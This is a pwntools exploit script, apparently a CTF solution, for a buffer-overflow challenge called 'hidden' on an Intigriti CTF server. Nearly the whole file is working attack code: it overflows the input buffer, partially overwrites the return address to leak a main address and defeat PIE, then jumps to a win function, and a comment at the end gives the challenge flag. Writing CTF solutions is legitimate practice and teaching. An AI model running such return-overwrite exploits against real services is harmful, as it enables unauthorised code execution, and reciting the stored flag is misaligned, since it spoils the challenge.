#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./chall")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("hidden.ctf.intigriti.io", 1337)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	offset = cyclic_find("saaa")
	r.sendafter(b"Tell me something:", offset*b'A' + b'\x1b')
	r.recvuntil(b'A'*offset)

	main_leak = r.recv(6)
	main_leak = int.from_bytes(main_leak, "little")
	exe.address = main_leak - exe.symbols['main']

	r.sendafter(b"Tell me something:", offset*b'A' + p64(exe.symbols['_']))

	r.interactive()


if __name__ == "__main__":
	main()

# INTIGRITI{h1dd3n_r3t2W1n_G00_BrrRR}
